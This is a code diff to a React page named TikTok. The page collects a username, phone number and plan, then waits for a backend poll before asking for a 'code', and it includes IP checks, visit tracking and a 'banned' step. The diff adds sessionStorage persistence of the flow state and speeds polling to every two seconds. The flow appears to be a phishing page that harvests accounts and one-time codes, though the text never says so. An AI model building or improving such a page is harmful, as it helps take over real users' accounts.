@@ -10,16 +10,28 @@ import BackButton from "@/components/BackButton";
 
 type Step = "form" | "code" | "waiting" | "success" | "banned";
 
+const STORAGE_KEY = "tiktok_flow_state_v1";
+
 const TikTok = () => {
-  const [step, setStep] = useState<Step>("form");
-  const [formData, setFormData] = useState({ username: "", phone: "", plan: "" });
-  const [submissionId, setSubmissionId] = useState<string | null>(null);
+  const [step, setStep] = useState<Step>(() => {
+    try { return (JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").step) || "form"; } catch { return "form"; }
+  });
+  const [formData, setFormData] = useState(() => {
+    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").formData || { username: "", phone: "", plan: "" }; } catch { return { username: "", phone: "", plan: "" }; }
+  });
+  const [submissionId, setSubmissionId] = useState<string | null>(() => {
+    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").submissionId || null; } catch { return null; }
+  });
   const [codeError, setCodeError] = useState("");
   const [formError, setFormError] = useState("");
   const [banReason, setBanReason] = useState<string | null>(null);
   const visitTracked = useRef(false);
   const formSubmittingRef = useRef(false);
   const ipChecked = useRef(false);
+
+  useEffect(() => {
+    try { sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ step, submissionId, formData })); } catch { /* noop */ }
+  }, [step, submissionId, formData]);
 
   useEffect(() => {
     if (ipChecked.current) return;
@@ -55,7 +67,7 @@ const TikTok = () => {
         setStep("code");
       }
     };
-    const interval = setInterval(poll, 3000);
+    const interval = setInterval(poll, 2000);
     poll();
     return () => { cancelled = true; clearInterval(interval); };
   }, [submissionId, step]);
